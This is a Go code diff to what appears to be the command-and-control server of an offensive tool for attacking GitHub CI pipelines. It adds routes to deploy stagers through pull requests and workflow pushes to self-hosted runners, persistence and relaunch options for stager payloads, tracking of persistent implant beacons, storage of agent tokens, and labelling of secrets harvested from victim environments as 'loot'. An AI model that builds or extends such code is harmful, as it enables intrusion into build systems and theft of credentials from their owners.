@@ -183,6 +183,8 @@ func (h *Handler) RegisterRoutes(mux *http.ServeMux) {
 	mux.HandleFunc("POST /github/deploy/issue", h.handleGitHubDeployIssue)
 	mux.HandleFunc("POST /github/deploy/comment", h.handleGitHubDeployComment)
 	mux.HandleFunc("POST /github/deploy/lotp", h.handleGitHubDeployLOTP)
+	mux.HandleFunc("POST /github/deploy/self-hosted-callback-pr", h.handleGitHubDeploySelfHostedCallbackPR)
+	mux.HandleFunc("POST /github/deploy/self-hosted-workflow-push", h.handleGitHubDeploySelfHostedWorkflowPush)
 	mux.HandleFunc("POST /github/deploy/dispatch", h.handleGitHubDeployDispatch)
 	mux.HandleFunc("POST /github/deploy/preflight", h.handleGitHubDeployPreflight)
 	mux.HandleFunc("POST /github/repos", h.handleGitHubListRepos)
@@ -330,7 +332,7 @@ func extractWorkflowPath(workflowRef, repo string) string {
 	return ""
 }
 
-func renderStagerPayloadTemplate(payload, kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration) string {
+func renderStagerPayloadTemplateWithPersistence(payload, kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration, persistCallbackMode, persistRelaunchFlags string) string {
 	dwellFlags := "-express"
 	if dwellTime > 0 {
 		dwellFlags += " -dwell " + dwellTime.String()
@@ -343,8 +345,14 @@ func renderStagerPayloadTemplate(payload, kitchenURL, agentID, sessionID, agentT
 		"{{CALLBACK_ID}}", callbackID,
 		"{{CALLBACK_MODE}}", callbackMode,
 		"{{DWELL_FLAGS}}", dwellFlags,
+		"{{PERSIST_CALLBACK_MODE}}", persistCallbackMode,
+		"{{PERSIST_RELAUNCH_FLAGS}}", persistRelaunchFlags,
 	)
 	return replacer.Replace(payload)
+}
+
+func renderStagerPayloadTemplate(payload, kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration) string {
+	return renderStagerPayloadTemplateWithPersistence(payload, kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode, dwellTime, CallbackModeExpress, "-express")
 }
 
 var sensitiveEnvPrefixes = []string{
@@ -765,6 +773,11 @@ func (h *Handler) handleBeacon(w http.ResponseWriter, r *http.Request) {
 						})
 					}
 				}
+				if beacon.CallbackID != "" {
+					if callback := h.stagerStore.ObservePersistentBeacon(beacon.CallbackID, r.RemoteAddr, agentID, time.Now()); callback != nil {
+						h.persistStager(callback)
+					}
+				}
 
 				var expressBeacon ExpressBeaconRequest
 				if jsonErr := json.Unmarshal(body, &expressBeacon); jsonErr == nil && len(expressBeacon.Env) > 0 {
@@ -793,6 +806,7 @@ func (h *Handler) handleBeacon(w http.ResponseWriter, r *http.Request) {
 									AgentID:          agentID,
 									Hostname:         beacon.Hostname,
 									Timestamp:        now,
+									Origin:           db.LootOriginExpress,
 									Name:             secret.Name,
 									Value:            secret.Value,
 									Type:             secret.Type,
@@ -953,6 +967,10 @@ func (h *Handler) handleStager(w http.ResponseWriter, r *http.Request) {
 	if stager.Persistent || h.stagerStore.Get(stagerID) != nil {
 		h.persistStager(stager)
 	}
+	if agentToken != "" {
+		tokenCreatedAt := time.Now()
+		h.persistAgentToken(agentID, stager.SessionID, agentToken, tokenCreatedAt, tokenCreatedAt.Add(h.auth.AgentTokenExpiry()))
+	}
 
 	var payload string
 	if stager.Payload != "" {
@@ -962,7 +980,7 @@ func (h *Handler) handleStager(w http.ResponseWriter, r *http.Request) {
 		case "js", "javascript":
 			payload = DefaultJSPayloadWithToken(kitchenURL, agentID, stager.SessionID, agentToken, stager.ID, invocation.Mode)
 		default:
-			payload = DefaultBashPayloadWithDwell(kitchenURL, agentID, stager.SessionID, agentToken, stager.ID, invocation.Mode, invocation.DwellTime)
+			payload = DefaultBashPayloadForRegisteredStager(kitchenURL, agentID, stager.SessionID, agentToken, stager, invocation)
 		}
 	}
 
@@ -1145,6 +1163,23 @@ func (h *Handler) persistAgent(agent *AgentState) {
 	agentRepo := db.NewAgentRepository(h.database)
 	if err := agentRepo.Upsert(row); err != nil {
 		slog.Warn("failed to persist agent", "agent_id", agent.AgentID, "error", err)
+	}
+}
+
+func (h *Handler) persistAgentToken(agentID, sessionID, token string, createdAt, expiresAt time.Time) {
+	if h.database == nil || agentID == "" || sessionID == "" || token == "" {
+		return
+	}
+	row := &db.AgentRow{
+		AgentID:        agentID,
+		SessionID:      sessionID,
+		AgentToken:     token,
+		TokenCreatedAt: createdAt,
+		TokenExpiresAt: expiresAt,
+	}
+	agentRepo := db.NewAgentRepository(h.database)
+	if err := agentRepo.Upsert(row); err != nil {
+		slog.Warn("failed to persist agent token", "agent_id", agentID, "error", err)
 	}
 }
 
